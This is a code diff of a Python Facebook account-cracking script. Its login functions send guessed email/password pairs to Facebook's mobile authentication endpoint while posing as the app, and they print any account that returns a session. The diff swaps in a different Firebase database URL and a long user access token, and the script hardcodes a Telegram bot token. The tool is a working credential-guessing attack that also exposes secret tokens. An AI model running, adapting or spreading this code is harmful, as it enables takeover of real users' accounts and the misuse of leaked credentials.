@@ -30,7 +30,7 @@ from requests.exceptions import ConnectionError
 requests.urllib3.disable_warnings()
 
 # --- Configuration ---
-FIREBASE_URL = "https://arman-f9a3b-default-rtdb.firebaseio.com/"
+FIREBASE_URL = "https://noorsalan-f7967-default-rtdb.asia-southeast1.firebasedatabase.app/"
 
 # TELEGRAM CONFIGURATION
 BOT_TOKEN = "8974282237:AAEov6IiXxLPOJT6-yN3GLTmRE643-O-6DY"
@@ -591,7 +591,7 @@ def login_1(uid):
                 'source': 'device_based_login',
                 'email': str(uid),
                 'password': str(pw),
-                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
+                'access_token': 'EAATlPU5kUrABSXogZCD6ntd0xAranOFWNZBWwQUulshewU9tjCKm8PawYQyr0dcepZARSyoOF7gSoXU20OAnMCfsImmXjvWDfwjVWof3bCJL5z8JP8L55oxjZBhlj9wMc7MsDjFNKMGX0QLcz70mATV8yeqIm4Fr3hy8CGK9aMBB14blRwHIPPZCcoJuqb1b07VnYwd7HZBhX2cINHlJW8wUX5FsQ4lhZCQaX3u',
                 'generate_session_cookies': '1',
                 'meta_inf_fbmeta': '',
                 'advertiser_id': str(uuid.uuid4()),
@@ -605,7 +605,6 @@ def login_1(uid):
                 'sim_country': 'PK',
                 'network_country': 'PK'
             }
-            # Host restored to b-graph.facebook.com
             headers = {
                 'Host': 'b-graph.facebook.com',
                 'User-Agent': 'Facebook',
@@ -654,7 +653,7 @@ def login_2(uid):
                     'x-fb-conn-uuid-client': 'sbQ1GdhKzcTild6k56CNYA==',
                     'Connection': 'keep-alive'
                 }
-                url = f"https://b-graph.facebook.com/auth/login?format=json&email={str(uid)}&password={str(pw)}&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true"
+                url = f"https://b-graph.facebook.com/auth/login?format=json&email={str(uid)}&password={str(pw)}&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=EAATlPU5kUrABSXogZCD6ntd0xAranOFWNZBWwQUulshewU9tjCKm8PawYQyr0dcepZARSyoOF7gSoXU20OAnMCfsImmXjvWDfwjVWof3bCJL5z8JP8L55oxjZBhlj9wMc7MsDjFNKMGX0QLcz70mATV8yeqIm4Fr3hy8CGK9aMBB14blRwHIPPZCcoJuqb1b07VnYwd7HZBhX2cINHlJW8wUX5FsQ4lhZCQaX3u&fb_api_req_friendly_name=authenticate&cpl=true"
                 po = session.get(url, headers=headers).json()
                 if 'session_key' in str(po):
                     print(f"\r\r\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mARMAN\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
